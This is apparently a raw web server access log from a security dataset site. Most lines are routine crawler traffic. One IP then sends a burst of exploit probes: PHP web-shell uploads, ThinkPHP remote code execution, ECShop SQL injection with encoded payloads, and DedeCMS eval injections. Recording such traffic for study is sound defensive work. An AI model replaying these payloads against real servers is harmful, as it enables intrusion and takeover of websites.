173.231.60.198 - - [22/Oct/2021:11:41:38 -0700] "GET /Datasets%20Description/PE_malware/?C=S;O=D HTTP/1.1" 200 646 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:41:44 -0700] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:47:42 -0700] "GET /self.logs/ HTTP/1.1" 200 32338 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:47:48 -0700] "GET /self.logs/?C=D;O=A HTTP/1.1" 200 32338 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:47:54 -0700] "GET /self.logs/?C=M;O=A HTTP/1.1" 200 33640 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:47:59 -0700] "GET /self.logs/?C=N;O=D HTTP/1.1" 200 33064 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:48:06 -0700] "GET /self.logs/?C=S;O=A HTTP/1.1" 200 38285 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:48:12 -0700] "GET /self.logs/2015/ HTTP/1.1" 200 7584 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:48:18 -0700] "GET /self.logs/2016/ HTTP/1.1" 200 7823 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:48:23 -0700] "GET /self.logs/?C=D;O=D HTTP/1.1" 200 33064 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:48:28 -0700] "GET /self.logs/?C=M;O=D HTTP/1.1" 200 34941 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:48:34 -0700] "GET /self.logs/?C=N;O=A HTTP/1.1" 200 32338 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:48:42 -0700] "GET /self.logs/?C=S;O=D HTTP/1.1" 200 38243 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
49.7.20.116 - - [22/Oct/2021:11:48:45 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
173.231.60.198 - - [22/Oct/2021:11:48:47 -0700] "GET /self.logs/2015/?C=D;O=A HTTP/1.1" 200 7584 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:48:53 -0700] "GET /self.logs/2015/?C=M;O=A HTTP/1.1" 200 7669 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:48:59 -0700] "GET /self.logs/2015/?C=N;O=D HTTP/1.1" 200 7730 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:49:05 -0700] "GET /self.logs/2015/?C=S;O=A HTTP/1.1" 200 8251 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:49:10 -0700] "GET /self.logs/2016/?C=D;O=A HTTP/1.1" 200 7823 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:49:16 -0700] "GET /self.logs/2016/?C=M;O=A HTTP/1.1" 200 7992 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:49:21 -0700] "GET /self.logs/2016/?C=N;O=D HTTP/1.1" 200 8035 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:49:26 -0700] "GET /self.logs/2016/?C=S;O=A HTTP/1.1" 200 8546 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:49:32 -0700] "GET /self.logs/2015/?C=D;O=D HTTP/1.1" 200 7730 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:49:37 -0700] "GET /self.logs/2015/?C=M;O=D HTTP/1.1" 200 7913 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:49:42 -0700] "GET /self.logs/2015/?C=N;O=A HTTP/1.1" 200 7584 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:49:49 -0700] "GET /self.logs/2015/?C=S;O=D HTTP/1.1" 200 8137 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:49:54 -0700] "GET /self.logs/2016/?C=D;O=D HTTP/1.1" 200 8035 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:50:00 -0700] "GET /self.logs/2016/?C=M;O=D HTTP/1.1" 200 8258 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:50:06 -0700] "GET /self.logs/2016/?C=N;O=A HTTP/1.1" 200 7823 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:50:12 -0700] "GET /self.logs/2016/?C=S;O=D HTTP/1.1" 200 8410 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
172.247.34.176 - - [22/Oct/2021:11:50:41 -0700] "GET / HTTP/1.1" 200 49133 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
173.231.60.198 - - [22/Oct/2021:11:50:54 -0700] "GET /data HTTP/1.1" 404 291 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:51:00 -0700] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 582 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:51:07 -0700] "GET /Datasets%20Description/HTML_Bro_log_2 HTTP/1.1" 301 582 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
173.231.60.198 - - [22/Oct/2021:11:51:19 -0700] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)" 
49.7.20.116 - - [22/Oct/2021:11:54:20 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
175.44.42.134 - - [22/Oct/2021:11:59:03 -0700] "GET / HTTP/1.1" 200 13186 "http://www.covblog.top/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
49.7.20.116 - - [22/Oct/2021:12:00:02 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.116 - - [22/Oct/2021:12:05:39 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
199.58.86.209 - - [22/Oct/2021:12:10:02 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.209 - - [22/Oct/2021:12:10:05 -0700] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
49.7.20.116 - - [22/Oct/2021:12:11:13 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
207.46.13.15 - - [22/Oct/2021:12:15:34 -0700] "GET /self.logs/2016/ HTTP/1.1" 200 7860 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.7.20.116 - - [22/Oct/2021:12:16:31 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
44.197.212.102 - - [22/Oct/2021:12:19:53 -0700] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (compatible; startmebot/1.0; +https://start.me/bot)" 
49.7.20.128 - - [22/Oct/2021:12:21:59 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.116 - - [22/Oct/2021:12:22:52 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
132.147.119.45 - - [22/Oct/2021:12:25:43 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
132.147.119.45 - - [22/Oct/2021:12:25:45 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
132.147.119.45 - - [22/Oct/2021:12:25:46 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
132.147.119.45 - - [22/Oct/2021:12:25:46 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
132.147.119.45 - - [22/Oct/2021:12:25:46 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
125.78.229.99 - - [22/Oct/2021:12:27:04 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 328 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:04 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:05 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 305 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:05 -0700] "GET /plus/moon.php HTTP/1.1" 404 305 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:05 -0700] "POST /plus/90sec.php HTTP/1.1" 418 746 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:05 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 418 746 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:05 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 418 746 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:06 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 418 746 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:06 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 418 746 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:06 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 305 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:07 -0700] "GET /user.php?act=login HTTP/1.1" 404 305 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:07 -0700] "POST /fdgq.php HTTP/1.1" 418 746 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:07 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=ppeeu.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E HTTP/1.1" 418 746 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:07 -0700] "POST /ppeeu.php HTTP/1.1" 418 746 "http://www.secrepo.com/ppeeu.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:07 -0700] "GET /user.php?act=login HTTP/1.1" 404 305 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:08 -0700] "POST /ysyqq.php HTTP/1.1" 418 746 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:08 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=txual.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$ HTTP/1.1" 418 746 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:08 -0700] "POST /txual.php HTTP/1.1" 418 746 "http://www.secrepo.com/txual.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:08 -0700] "GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 HTTP/1.1" 404 305 "http://www.secrepo.com/plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
125.78.229.99 - - [22/Oct/2021:12:27:09 -0700] "GET /plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 418 746 "http://www.secrepo.com/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=